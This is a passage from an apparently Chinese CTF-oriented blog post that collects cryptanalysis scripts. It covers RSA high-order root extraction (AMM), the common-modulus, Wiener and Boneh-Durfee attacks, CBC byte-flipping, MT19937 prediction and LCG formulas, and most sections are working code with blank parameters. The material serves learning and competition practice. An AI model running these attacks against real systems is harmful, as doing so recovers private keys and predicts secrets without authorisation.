class="number">1</span>) % e == <span class="number">0</span>)</span><br><span class="line">    p = onemod(e, N)</span><br><span class="line">    </span><br><span class="line">    t = <span class="number">0</span></span><br><span class="line">    s = N - <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> (s % e == <span class="number">0</span>):</span><br><span class="line">        s = s // e</span><br><span class="line">        t += <span class="number">1</span></span><br><span class="line">    k = <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> ((s * k + <span class="number">1</span>) % e != <span class="number">0</span>):</span><br><span class="line">        k += <span class="number">1</span></span><br><span class="line">    delta = (s * k + <span class="number">1</span>) // e</span><br><span class="line"></span><br><span class="line">    a = gmpy2.powmod(p, e ** (t - <span class="number">1</span>) * s, N)</span><br><span class="line">    b = gmpy2.powmod(x, e * delta - <span class="number">1</span>, N)</span><br><span class="line">    c = gmpy2.powmod(p, s ,N)</span><br><span class="line">    h = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(<span class="number">1</span>, t)):</span><br><span class="line">        d = gmpy2.powmod(b, e ** (t - <span class="number">1</span> -i), N)</span><br><span class="line">        <span class="keyword">if</span> d == <span class="number">1</span>:</span><br><span class="line">            j = <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            j = (- math.Log(d, a)) % e</span><br><span class="line">        b = b * (c ** (e ** j)) % N</span><br><span class="line">        h = h * (c ** j) % N</span><br><span class="line">        c = c ** e % N</span><br><span class="line">    result = gmpy2.powmod(x, delta, N) * h</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ALL_ROOT2</span>(<span class="params">r, q</span>):  </span><br><span class="line">    list1 = <span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">len</span>(list1) &lt; r):</span><br><span class="line">        p = gmpy2.powmod(random.randint(<span class="number">1</span>, q - <span class="number">1</span>), (q - <span class="number">1</span>) // r, q)</span><br><span class="line">        list1.add(p)</span><br><span class="line">    <span class="keyword">return</span> list1</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ALL_Solution</span>(<span class="params">m, q, rt, cq, e</span>):</span><br><span class="line">    mp = []</span><br><span class="line">    <span class="keyword">for</span> pr <span class="keyword">in</span> rt:</span><br><span class="line">        r = (pr * m) % q</span><br><span class="line">        mp.append(r)</span><br><span class="line">    <span class="keyword">return</span> mp</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calc</span>(<span class="params">mp, mq, e, p, q</span>):</span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    j = <span class="number">1</span></span><br><span class="line">    t1 = gmpy2.invert(q, p)</span><br><span class="line">    t2 = gmpy2.invert(p, q)</span><br><span class="line">    <span class="keyword">for</span> mp1 <span class="keyword">in</span> mp:</span><br><span class="line">        <span class="keyword">for</span> mq1 <span class="keyword">in</span> mq:</span><br><span class="line">            j += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> j % <span class="number">100000</span> == <span class="number">0</span>:</span><br><span class="line">                <span class="built_in">print</span>(j)</span><br><span class="line">            ans = (mp1 * t1 * q + mq1 * t2 * p) % (p * q)</span><br><span class="line">            <span class="keyword">if</span> check(ans):</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">m</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        a = long_to_bytes(m)</span><br><span class="line">        <span class="keyword">if</span> flag_info <span class="keyword">in</span> a:</span><br><span class="line">            <span class="built_in">print</span>(a)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">n = </span><br><span class="line">c = </span><br><span class="line">p = </span><br><span class="line">q = </span><br><span class="line">e = </span><br><span class="line">flag_info = <span class="string">b&#x27;flag&#123;&#x27;</span></span><br><span class="line"></span><br><span class="line">cp = c % p</span><br><span class="line">cq = c % q</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;start&quot;</span>)</span><br><span class="line"></span><br><span class="line">mp = AMM_rth(cp, e, p)</span><br><span class="line">mq = AMM_rth(cq, e, q)</span><br><span class="line"></span><br><span class="line">rt1 = ALL_ROOT2(e, p)  </span><br><span class="line">rt2 = ALL_ROOT2(e, q)</span><br><span class="line"></span><br><span class="line">amp = ALL_Solution(mp, p, rt1, cp, e)  </span><br><span class="line">amq = ALL_Solution(mq, q, rt2, cq, e)</span><br><span class="line"></span><br><span class="line">calc(amp, amq, e, p, q)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;run over&quot;</span>)</span><br></pre></td></tr></table></figure><p>当然，这里还得介绍一下sagemath中有一个很好用的方法.nth_root，可以非常有效地完成域下的高次开根</p><p>大概用法如下，可视情况做出修改</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">K=Zmod(n)</span><br><span class="line">x=K(c).nth_root(e,<span class="built_in">all</span>=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>这样可以返回所有在模n整数环下，满足x^e ≡ c (mod n)的x</p><h2 id="共模攻击"><a href="#共模攻击" class="headerlink" title="共模攻击"></a>共模攻击</h2><p>用于解决在GF(n)下，明文相同，公钥不同，而模n又很大难以分解的情况（两组公钥和密文已知）<br>$$<br>\begin{cases}m^{e_1}\equiv c_1(mod\ n) \ m^{e_2}\equiv c_2(mod\ n)\end{cases}<br>$$<br>两边分别同时乘s1,s2次方<br>$$<br>\begin{cases}m^{e_1s_1}\equiv c_1^{s_1}(mod\ n) \ m^{e_2s_2}\equiv c_2^{s_2}(mod\ n)\end{cases}<br>$$<br>两式相乘<br>$$<br>m^{e_1s_1+e_2s_2}\equiv c_1^{s_1}c_2^{s_2}(mod\ n)<br>$$<br>这里使用扩展欧几里得算法，我们可以找到能满足e1s1+e2s2&#x3D;1的s1和s2。又因为一般来说m&lt;n，所以<br>$$<br>m&#x3D;c_1^{s_1}c_2^{s_2}\ mod\ n<br>$$<br>代码实现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">n=</span><br><span class="line">e1=</span><br><span class="line">e2=</span><br><span class="line">c1=</span><br><span class="line">c2=</span><br><span class="line">_gcd,s1,s2=gmpy2.gcdext(e1,e2)</span><br><span class="line">m=<span class="built_in">pow</span>(c1,s1,n)*<span class="built_in">pow</span>(c2,s2,n)%n</span><br></pre></td></tr></table></figure><h2 id="维纳攻击"><a href="#维纳攻击" class="headerlink" title="维纳攻击"></a>维纳攻击</h2><p>参考<a href="https://blog.csdn.net/XiongSiqi_blog/article/details/130515028">这篇文章</a></p><p>用于RSA中e很大的时候</p><p>代码实现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">continuedFra</span>(<span class="params">x, y</span>):</span><br><span class="line">    cf = []</span><br><span class="line">    <span class="keyword">while</span> y:</span><br><span class="line">        cf.append(x // y)</span><br><span class="line">        x, y = y, x % y</span><br><span class="line">    <span class="keyword">return</span> cf</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gradualFra</span>(<span class="params">cf</span>):</span><br><span class="line">    numerator = <span class="number">0</span></span><br><span class="line">    denominator = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> cf[::-<span class="number">1</span>]:</span><br><span class="line">        numerator, denominator = denominator, x * denominator + numerator</span><br><span class="line">    <span class="keyword">return</span> numerator, denominator</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_pq</span>(<span class="params">a, b, c</span>):</span><br><span class="line">    par = gmpy2.isqrt(b * b - <span class="number">4</span> * a * c)</span><br><span class="line">    <span class="keyword">return</span> (-b + par) // (<span class="number">2</span> * a), (-b - par) // (<span class="number">2</span> * a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getGradualFra</span>(<span class="params">cf</span>):</span><br><span class="line">    gf = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(cf) + <span class="number">1</span>):</span><br><span class="line">        gf.append(gradualFra(cf[:i]))</span><br><span class="line">    <span class="keyword">return</span> gf</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">wienerAttack</span>(<span class="params">e, n</span>):</span><br><span class="line">    cf = continuedFra(e, n)</span><br><span class="line">    gf = getGradualFra(cf)</span><br><span class="line">    <span class="keyword">for</span> d, k <span class="keyword">in</span> gf:</span><br><span class="line">        <span class="keyword">if</span> k == <span class="number">0</span>: <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> (e * d - <span class="number">1</span>) % k != <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        phi = (e * d - <span class="number">1</span>) // k</span><br><span class="line">        p, q = solve_pq(<span class="number">1</span>, n - phi + <span class="number">1</span>, n)</span><br><span class="line">        <span class="keyword">if</span> p * q == n:</span><br><span class="line">            <span class="keyword">return</span> d</span><br><span class="line">n=</span><br><span class="line">e=</span><br><span class="line">c=</span><br><span class="line">d=wienerAttack(e, n)</span><br><span class="line">m=<span class="built_in">pow</span>(c, d, n)</span><br></pre></td></tr></table></figure><h2 id="Boneh-Durfee攻击"><a href="#Boneh-Durfee攻击" class="headerlink" title="Boneh Durfee攻击"></a>Boneh Durfee攻击</h2><p>类似维纳攻击，但可使d范围更大</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br></pre></td><td class="code"><pre><span class="line">import time</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line">debug = True</span><br><span class="line">strict = False</span><br><span class="line">helpful_only = True</span><br><span class="line">dimension_min = 7</span><br><span class="line">def helpful_vectors(BB, modulus):</span><br><span class="line">    nothelpful = 0</span><br><span class="line">    for ii in range(BB.dimensions()[0]):</span><br><span class="line">        if BB[ii,ii] &gt;= modulus:</span><br><span class="line">            nothelpful += 1</span><br><span class="line"> </span><br><span class="line">    print (nothelpful, &quot;/&quot;, BB.dimensions()[0], &quot; vectors are not helpful&quot;)</span><br><span class="line">def matrix_overview(BB, bound):</span><br><span class="line">    for ii in range(BB.dimensions()[0]):</span><br><span class="line">        a = (&#x27;%02d &#x27; % ii)</span><br><span class="line">        for jj in range(BB.dimensions()[1]):</span><br><span class="line">            a += &#x27;0&#x27; if BB[ii,jj] == 0 else &#x27;X&#x27;</span><br><span class="line">            if BB.dimensions()[0] &lt; 60:</span><br><span class="line">                a += &#x27; &#x27;</span><br><span class="line">        if BB[ii, ii] &gt;= bound:</span><br><span class="line">            a += &#x27;~&#x27;</span><br><span class="line">        print (a)</span><br><span class="line">def remove_unhelpful(BB, monomials, bound, current):</span><br><span class="line">    if current == -1 or BB.dimensions()[0] &lt;= dimension_min:</span><br><span class="line">        return BB</span><br><span class="line">    for ii in range(current, -1, -1):</span><br><span class="line">        if BB[ii, ii] &gt;= bound:</span><br><span class="line">            affected_vectors = 0</span><br><span class="line">            affected_vector_index = 0</span><br><span class="line">            for jj in range(ii + 1, BB.dimensions()[0]):</span><br><span class="line">                if BB[jj, ii] != 0:</span><br><span class="line">                    affected_vectors += 1</span><br><span class="line">                    affected_vector_index = jj</span><br><span class="line">            if affected_vectors == 0:</span><br><span class="line">                print (&quot;* removing unhelpful vector&quot;, ii)</span><br><span class="line">                BB = BB.delete_columns([ii])</span><br><span class="line">                BB = BB.delete_rows([ii])</span><br><span class="line">                monomials.pop(ii)</span><br><span class="line">                BB = remove_unhelpful(BB, monomials, bound, ii-1)</span><br><span class="line">                return BB</span><br><span class="line">            elif affected_vectors == 1:</span><br><span class="line">                affected_deeper = True</span><br><span class="line">                for kk in range(affected_vector_index + 1, BB.dimensions()[0]):</span><br><span class="line">                    if BB[kk, affected_vector_index] != 0:</span><br><span class="line">                        affected_deeper = False</span><br><span class="line">                if affected_deeper and abs(bound - BB[affected_vector_index, affected_vector_index]) &lt; abs(bound - BB[ii, ii]):</span><br><span class="line">                    print (&quot;* removing unhelpful vectors&quot;, ii, &quot;and&quot;, affected_vector_index)</span><br><span class="line">                    BB = BB.delete_columns([affected_vector_index, ii])</span><br><span class="line">                    BB = BB.delete_rows([affected_vector_index, ii])</span><br><span class="line">                    monomials.pop(affected_vector_index)</span><br><span class="line">                    monomials.pop(ii)</span><br><span class="line">                    BB = remove_unhelpful(BB, monomials, bound, ii-1)</span><br><span class="line">                    return BB</span><br><span class="line">    return BB</span><br><span class="line">def boneh_durfee(pol, modulus, mm, tt, XX, YY):</span><br><span class="line">    PR.&lt;u, x, y&gt; = PolynomialRing(ZZ)</span><br><span class="line">    Q = PR.quotient(x*y + 1 - u) # u = xy + 1</span><br><span class="line">    polZ = Q(pol).lift()</span><br><span class="line">    UU = XX*YY + 1</span><br><span class="line">    gg = []</span><br><span class="line">    for kk in range(mm + 1):</span><br><span class="line">        for ii in range(mm - kk + 1):</span><br><span class="line">            xshift = x^ii * modulus^(mm - kk) * polZ(u, x, y)^kk</span><br><span class="line">            gg.append(xshift)</span><br><span class="line">    gg.sort()</span><br><span class="line">    monomials = []</span><br><span class="line">    for polynomial in gg:</span><br><span class="line">        for monomial in polynomial.monomials():</span><br><span class="line">            if monomial not in monomials:</span><br><span class="line">                monomials.append(monomial)</span><br><span class="line">    monomials.sort()</span><br><span class="line">    for jj in range(1, tt + 1):</span><br><span class="line">        for kk in range(floor(mm/tt) * jj, mm + 1):</span><br><span class="line">            yshift = y^jj * polZ(u, x, y)^kk * modulus^(mm - kk)</span><br><span class="line">            yshift = Q(yshift).lift()</span><br><span class="line">            gg.append(yshift)</span><br><span class="line">    for jj in range(1, tt + 1):</span><br><span class="line">        for kk in range(floor(mm/tt) * jj, mm + 1):</span><br><span class="line">            monomials.append(u^kk * y^jj)</span><br><span class="line">    nn = len(monomials)</span><br><span class="line">    BB = Matrix(ZZ, nn)</span><br><span class="line">    for ii in range(nn):</span><br><span class="line">        BB[ii, 0] = gg[ii](0, 0, 0)</span><br><span class="line">        for jj in range(1, ii + 1):</span><br><span class="line">            if monomials[jj] in gg[ii].monomials():</span><br><span class="line">                BB[ii, jj] = gg[ii].monomial_coefficient(monomials[jj]) * monomials[jj](UU,XX,YY)</span><br><span class="line">    if helpful_only:</span><br><span class="line">        BB = remove_unhelpful(BB, monomials, modulus^mm, nn-1)</span><br><span class="line">        nn = BB.dimensions()[0]</span><br><span class="line">        if nn == 0:</span><br><span class="line">            print (&quot;failure&quot;)</span><br><span class="line">            return 0,0</span><br><span class="line">    if debug:</span><br><span class="line">        helpful_vectors(BB, modulus^mm)</span><br><span class="line">    det = BB.det()</span><br><span class="line">    bound = modulus^(mm*nn)</span><br><span class="line">    if det &gt;= bound:</span><br><span class="line">        print (&quot;We do not have det &lt; bound. Solutions might not be found.&quot;)</span><br><span class="line">        print (&quot;Try with highers m and t.&quot;)</span><br><span class="line">        if debug:</span><br><span class="line">            diff = (log(det) - log(bound)) / log(2)</span><br><span class="line">            print (&quot;size det(L) - size e^(m*n) = &quot;, floor(diff))</span><br><span class="line">        if strict:</span><br><span class="line">            return -1, -1</span><br><span class="line">    else:</span><br><span class="line">        print (&quot;det(L) &lt; e^(m*n) (good! If a solution exists &lt; N^delta, it will be found)&quot;)</span><br><span class="line">    if debug:</span><br><span class="line">        matrix_overview(BB, modulus^mm)</span><br><span class="line">    if debug:</span><br><span class="line">        print (&quot;optimizing basis of the lattice via LLL, this can take a long time&quot;)</span><br><span class="line">    BB = BB.LLL()</span><br><span class="line">    if debug:</span><br><span class="line">        print (&quot;LLL is done!&quot;)</span><br><span class="line">    if debug:</span><br><span class="line">        print (&quot;looking for independent vectors in the lattice&quot;)</span><br><span class="line">    found_polynomials = False</span><br><span class="line">    for pol1_idx in range(nn - 1):</span><br><span class="line">        for pol2_idx in range(pol1_idx + 1, nn):</span><br><span class="line">            PR.&lt;w,z&gt; = PolynomialRing(ZZ)</span><br><span class="line">            pol1 = pol2 = 0</span><br><span class="line">            for jj in range(nn):</span><br><span class="line">                pol1 += monomials[jj](w*z+1,w,z) * BB[pol1_idx, jj] / monomials[jj](UU,XX,YY)</span><br><span class="line">                pol2 += monomials[jj](w*z+1,w,z) * BB[pol2_idx, jj] / monomials[jj](UU,XX,YY)</span><br><span class="line">            PR.&lt;q&gt; = PolynomialRing(ZZ)</span><br><span class="line">            rr = pol1.resultant(pol2)</span><br><span class="line">            if rr.is_zero() or rr.monomials() == [1]:</span><br><span class="line">                continue</span><br><span class="line">            else:</span><br><span class="line">                print (&quot;found them, using vectors&quot;, pol1_idx, &quot;and&quot;, pol2_idx)</span><br><span class="line">                found_polynomials = True</span><br><span class="line">                break</span><br><span class="line">        if found_polynomials:</span><br><span class="line">            break</span><br><span class="line">    if not found_polynomials:</span><br><span class="line">        print (&quot;no independant vectors could be found. This should very rarely happen...&quot;)</span><br><span class="line">        return 0, 0</span><br><span class="line">    rr = rr(q, q)</span><br><span class="line">    soly = rr.roots()</span><br><span class="line">    if len(soly) == 0:</span><br><span class="line">        print (&quot;Your prediction (delta) is too small&quot;)</span><br><span class="line">        return 0, 0</span><br><span class="line">    soly = soly[0][0]</span><br><span class="line">    ss = pol1(q, soly)</span><br><span class="line">    solx = ss.roots()[0][0]</span><br><span class="line">    return solx, soly</span><br><span class="line">def example(N,e,delta):</span><br><span class="line">    t = int((1-2*delta) * m)</span><br><span class="line">    X = 2*floor(N^delta)</span><br><span class="line">    Y = floor(N^(1/2))</span><br><span class="line">    P.&lt;x,y&gt; = PolynomialRing(ZZ)</span><br><span class="line">    A = int((N+1)/2)</span><br><span class="line">    pol = 1 + x * (A + y)</span><br><span class="line">    if debug:</span><br><span class="line">        print (&quot;=== checking values ===&quot;)</span><br><span class="line">        print (&quot;* delta:&quot;, delta)</span><br><span class="line">        print (&quot;* delta &lt; 0.292&quot;, delta &lt; 0.292)</span><br><span class="line">        print (&quot;* size of e:&quot;, int(log(e)/log(2)))</span><br><span class="line">        print (&quot;* size of N:&quot;, int(log(N)/log(2)))</span><br><span class="line">        print (&quot;* m:&quot;, m, &quot;, t:&quot;, t)</span><br><span class="line">    if debug:</span><br><span class="line">        print (&quot;=== running algorithm ===&quot;)</span><br><span class="line">        start_time = time.time()</span><br><span class="line"> </span><br><span class="line">    solx, soly = boneh_durfee(pol, e, m, t, X, Y)</span><br><span class="line">    if solx &gt; 0:</span><br><span class="line">        print (&quot;=== solution found ===&quot;)</span><br><span class="line">        if False:</span><br><span class="line">            print (&quot;x:&quot;, solx)</span><br><span class="line">            print (&quot;y:&quot;, soly)</span><br><span class="line"> </span><br><span class="line">        d = int(pol(solx, soly) / e)</span><br><span class="line">        print (&quot;private key found:&quot;, d)</span><br><span class="line">    else:</span><br><span class="line">        print (&quot;=== no solution was found ===&quot;)</span><br><span class="line"> </span><br><span class="line">    if debug:</span><br><span class="line">        print(&quot;=== %s seconds ===&quot; % (time.time() - start_time))</span><br><span class="line">    return d</span><br><span class="line"> </span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    c =</span><br><span class="line">    n =</span><br><span class="line">    e =</span><br><span class="line">    delta = 0.28 # this means that d &lt; N^delta</span><br><span class="line">    d = example(n,e,delta)</span><br><span class="line">    print(long_to_bytes(int(pow(c,d,n))))</span><br></pre></td></tr></table></figure><h2 id="CBC字节翻转攻击"><a href="#CBC字节翻转攻击" class="headerlink" title="CBC字节翻转攻击"></a>CBC字节翻转攻击</h2><p>参考<a href="https://blog.csdn.net/xiongsiqi_blog/article/details/131925246">这篇文章</a></p><p>用于CBC模式下的AES加密</p><p>个人认为上面的文章中这一段讲得已经很清楚了</p><p><img src="/images/%E5%AF%86%E7%A0%81%E5%AD%A6%E7%AE%97%E6%B3%95%E6%95%A3%E8%AE%B0/image-20240721165239569.png" alt="image-20240721165239569"></p><p>实现代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">strxor</span>(<span class="params">a1, a2</span>): </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>([b1 ^ b2 <span class="keyword">for</span> b1,b2 <span class="keyword">in</span> <span class="built_in">zip</span>(a1,a2)])</span><br><span class="line">A=<span class="string">b&#x27;&#x27;</span></span><br><span class="line">C=<span class="string">b&#x27;&#x27;</span></span><br><span class="line">CC=<span class="string">b&#x27;&#x27;</span></span><br><span class="line">AA=strxor(A,C)</span><br><span class="line">AA=strxor(AA,CC)</span><br><span class="line"><span class="built_in">print</span>(AA)</span><br></pre></td></tr></table></figure><h2 id="MT19937伪随机数预测"><a href="#MT19937伪随机数预测" class="headerlink" title="MT19937伪随机数预测"></a>MT19937伪随机数预测</h2><p>MT19937，即梅森旋转算法，是一种伪随机数的生成算法，python中的random模块生成“随机数”时使用的就是这种算法。</p><p>根据其原理，有一个叫randcrack的python模块可以对其生成的“随机数”进行预测，前提是需要已知已经生成的至少624个32位二进制数，这样才能预测出下一个生成的数会是多少。</p><p>实现代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> randcrack <span class="keyword">import</span> RandCrack</span><br><span class="line">rc = RandCrack()</span><br><span class="line">Rand=[] <span class="comment">#624个32位二进制数</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">624</span>):</span><br><span class="line">    rc.submit(Rand[i])</span><br><span class="line">pre=rc.predict_getrandbits(<span class="number">100</span>) <span class="comment">#假设要预测的是下一个100位二进制数</span></span><br><span class="line"><span class="built_in">print</span>(pre)</span><br></pre></td></tr></table></figure><p>那么前面给出的是312个64位数呢？</p><p>其实，random生成64位数的方式就是先生成2个32位数，然后将它们拼起来得到的。因此我们只需要把这个64位数拆开成两个32位数即可。</p><p>实现代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> randcrack <span class="keyword">import</span> RandCrack</span><br><span class="line">rc = RandCrack()</span><br><span class="line">Rand= [] <span class="comment">#312个64位数</span></span><br><span class="line">prng=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> Rand:</span><br><span class="line">    prng.append(<span class="built_in">int</span>(i)&amp; (<span class="number">2</span> ** <span class="number">32</span> - <span class="number">1</span>))</span><br><span class="line">    prng.append(<span class="built_in">int</span>(i)&gt;&gt; <span class="number">32</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">624</span>):</span><br><span class="line">    rc.submit(prng[i])</span><br><span class="line">notrandom=rc.predict_getrandbits(<span class="number">100</span>) <span class="comment">#假设要预测的是下一个100位二进制数</span></span><br><span class="line"><span class="built_in">print</span>(notrandom)</span><br></pre></td></tr></table></figure><h2 id="LCG"><a href="#LCG" class="headerlink" title="LCG"></a>LCG</h2><p>参考<a href="https://blog.csdn.net/weixin_45883223/article/details/115299389">这篇文章</a>和<a href="https://blog.csdn.net/superprintf/article/details/108964563">这篇文章</a></p><p>LCG，线性同余法，是一种生成伪随机数的方法，用一个公式来概括就是<br>$$<br>X_{n+1}&#x3D;(aX_n+b)\ mod\ m<br>$$<br>基本围绕以下四个公式，即可解决各类基础的LCG问题</p><p><img src="/images/%E5%AF%86%E7%A0%81%E5%AD%A6%E7%AE%97%E6%B3%95%E6%95%A3%E8%AE%B0/c00bad18-4f1e-4719-81d0-526a8db7030c.png" alt="c00bad18-4f1e-4719-81d0-526a8db7030c"></p>]]></content>
      
      
